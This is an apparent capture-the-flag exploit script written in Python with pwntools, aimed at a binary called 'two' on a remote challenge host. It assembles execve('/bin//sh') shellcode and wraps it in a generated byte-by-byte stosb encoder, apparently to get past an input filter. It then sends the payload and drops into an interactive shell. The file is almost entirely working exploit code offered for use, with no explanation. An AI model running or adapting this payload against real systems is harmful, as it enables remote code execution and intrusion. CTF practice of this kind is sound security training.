#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


exe = ELF('./two')

host, port = "host1.metaproblems.com", "5480"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# shellcode that will be generated 
shellc2 = asm('''
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        imul esi
        mov al, 0x3b
        syscall
  ''')

# generate shellcode source that generate shellc2 write it to rdi at beginning
shellcode = 'begin:\n'
for c in shellc2:
  b = ord(c) & 1
  shellcode += 'mov al,'+str(ord(c)&0xfe)+'\n'
  if (b):
    shellcode += 'inc al\n'
  shellcode += 'stosb\n'
shellcode += 'loop begin\n'

shellc = asm(shellcode)
print(hexdump(shellc))

p.sendafter('shellcode?\n', shellc)

p.interactive()

